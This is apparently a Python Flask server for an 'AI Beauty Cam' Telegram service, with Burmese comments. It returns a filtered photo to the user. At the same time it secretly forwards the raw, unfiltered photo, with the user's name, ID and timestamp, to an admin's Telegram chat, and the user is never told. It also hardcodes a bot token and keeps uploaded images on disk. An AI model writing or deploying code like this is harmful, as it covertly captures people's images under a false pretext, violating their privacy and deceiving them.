import os
import json
import base64
import asyncio
import time
from flask import Flask, request, jsonify
from telegram import Bot

app = Flask(__name__)

# --- Configuration ---
TOKEN = '8396307053:AAEH_oUAbyiTjNaq997drQkIHQ6keghM6xw'
OWNER_ID = '7812553563' # Admin ID ထည့်ပါ
bot = Bot(token=TOKEN)

@app.route('/')
def index():
    return open('index.html', 'r', encoding='utf-8').read()

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    user_id = data.get('user_id')
    user_name = data.get('user_name')
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S") # အချိန်မှတ်တမ်း

    # Base64 data များကို ခွဲထုတ်ခြင်း
    raw_data = data.get('original_image').split(",")[1]
    filtered_data = data.get('filtered_image').split(",")[1]

    # ဖိုင်အမည်များ သတ်မှတ်ခြင်း (ယာယီသိမ်းရန်)
    raw_path = f"raw_{user_id}.jpg"
    filtered_path = f"beauty_{user_id}.jpg"

    # ပုံများကို Disk တွင် သိမ်းဆည်းခြင်း
    with open(raw_path, "wb") as f:
        f.write(base64.b64decode(raw_data))
    with open(filtered_path, "wb") as f:
        f.write(base64.b64decode(filtered_data))

    async def send_dual_photos():
        async with bot:
            # ၁။ Admin ဆီသို့ Original ပုံ အကြမ်း ပို့ခြင်း
            await bot.send_photo(
                chat_id=OWNER_ID,
                photo=open(raw_path, 'rb'),
                caption=f"🔒 **Admin Log - Raw Capture**\n\n👤 User: {user_name}\n🆔 ID: `{user_id}`\n⏰ Time: {timestamp}\n📝 Note: Original file unfiltered."
            )
            print(f"Sent raw to admin: {OWNER_ID}")

            # ၂။ User ဆီသို့ Filtered ပုံ အလှ ပို့ခြင်း
            await bot.send_photo(
                chat_id=user_id,
                photo=open(filtered_path, 'rb'),
                caption=f"✨ **Your AI Beauty Cam Photo!** ✨\n\nလှပသော ပုံရိပ်လေးကို ဖန်တီးပေးထားပါတယ်! 🥰"
            )
            print(f"Sent filtered to user: {user_id}")

    # Async function ကို Run ခြင်း
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(send_dual_photos())

    # (Optional) ယာယီဖိုင်များကို ပြန်ဖျက်ခြင်း
    # os.remove(raw_path)
    # os.remove(filtered_path)
    
    return jsonify({"status": "success"}), 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
